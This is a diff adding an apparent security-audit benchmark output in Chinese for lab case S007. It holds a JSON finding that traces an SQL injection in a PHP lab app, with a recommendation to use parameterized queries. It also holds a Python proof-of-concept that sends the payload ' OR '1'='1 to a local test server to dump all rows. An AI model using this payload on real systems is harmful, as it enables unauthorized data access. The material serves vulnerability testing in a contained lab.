@@ -1,0 +1,92 @@
+```json
+{
+  "sample_id": "S007",
+  "prediction": "vulnerable",
+  "vulnerability_type": "SQL注入",
+  "locations": ["F01:0008", "F01:0011", "F02:0006", "F02:0007", "F02:0008", "F02:0009"],
+  "evidence": {
+    "source": "F01:0008 直接读取 $_GET['name'] 作为 $name，未做过滤或类型约束。",
+    "flow": "F01:0008 的 $name 传入 F01:0011 find_people_by_name($db, $name)；F02:0006 接收 $name；F02:0007 将 $name 字符串拼接到 SQL；F02:0008-0009 通过 $db->query($sql) 执行。",
+    "guard": "无效：F02:0007 使用字符串拼接构造 SQL，未见绑定参数、白名单、类型转换或 SQL 转义；F01:0022-0023 的 htmlspecialchars 仅用于 HTML 输出，不能保护 SQL。",
+    "sink": "F02:0007 构造 SELECT id, name FROM lab_people WHERE name = '...'；F02:0008-0009 通过 mysqli query 执行该 SQL。"
+  },
+  "prerequisites": [
+    "PHP 8.5 本机服务监听 http://127.0.0.1:4280",
+    "入口 http://127.0.0.1:4280/lab_cases/S007/index.php 可访问",
+    "共享 bootstrap 已建立 $db mysqli 连接且连接字符集为 utf8mb4",
+    "lab_people 初始数据为 id=1 Alice、id=2 Bob、id=3 Carol"
+  ],
+  "missing_context": [
+    "common/db_connect.php 的具体实现未提供；仅依据运行上下文认定 $db 已建立，未据此推断其他防护。"
+  ],
+  "poc_generated": true,
+  "poc_language": "python3",
+  "poc_instructions": "阶段说明：本输出仅为模型分析发现与本地验证方案；脚本可执行，但未执行，未实际触发漏洞。运行：python3 poc_s007.py。脚本固定访问 http://127.0.0.1:4280/lab_cases/S007/index.php，不接受任意主机，不跟随重定向，不外发数据。普通业务对照：name=Alice，预期页面解析记录为 {('1','Alice')}。测试步骤：发送 name=' OR '1'='1，预期页面解析记录为 {('1','Alice'),('2','Bob'),('3','Carol')}。成功断言比较解析后的实际业务记录集合，不以 HTTP 200 作为成功条件。测试为只读 SELECT，不修改数据库；观察者浏览器应看到普通请求一行、测试请求三行，数据库记录不变。失败时检查 PHP 服务、入口路径、bootstrap 的 $db、lab_people 三行初始数据及错误日志。防护建议：对 name 使用参数化查询或预处理绑定，不要拼接 SQL；该建议未在本验证中作为已修复事实。"
+}
+```
+
+```python
+#!/usr/bin/env python3
+import http.client
+import re
+import sys
+import urllib.parse
+
+HOST = "127.0.0.1"
+PORT = 4280
+PATH = "/lab_cases/S007/index.php"
+TIMEOUT = 10
+
+ROW_RE = re.compile(r"<p>ID\s*([^：<]+)：([^<]+)</p>")
+
+
+def fetch_records(name):
+    query = urllib.parse.urlencode({"name": name})
+    conn = http.client.HTTPConnection(HOST, PORT, timeout=TIMEOUT)
+    try:
+        conn.request(
+            "GET",
+            PATH + "?" + query,
+            headers={"User-Agent": "S007-audit-poc"},
+        )
+        resp = conn.getresponse()
+        body = resp.read().decode("utf-8", "replace")
+        status = resp.status
+    finally:
+        conn.close()
+
+    if status != 200:
+        raise RuntimeError(f"意外 HTTP 状态: {status}, body={body[:200]!r}")
+
+    records = set()
+    for row_id, row_name in ROW_RE.findall(body):
+        records.add((row_id.strip(), row_name.strip()))
+    return records
+
+
+def main():
+    normal = fetch_records("Alice")
+    test = fetch_records("' OR '1'='1")
+
+    expected_normal = {("1", "Alice")}
+    expected_test = {("1", "Alice"), ("2", "Bob"), ("3", "Carol")}
+
+    print("普通请求解析记录:", normal)
+    print("测试请求解析记录:", test)
+
+    if normal != expected_normal:
+        print("普通对照失败：请检查 lab_people 初始数据、bootstrap 的 $db、入口路径和 PHP 错误日志。")
+        return 1
+
+    if test != expected_test:
+        print("测试断言失败：未观察到预期的三行业务记录；请检查数据库数据、查询错误和运行前提。")
+        return 1
+
+    print("断言通过：普通请求仅返回 Alice，测试请求返回三行业务记录。")
+    print("注意：本脚本只读 SELECT，不修改数据库；未实际执行验证。")
+    return 0
+
+
+if __name__ == "__main__":
+    sys.exit(main())
+```
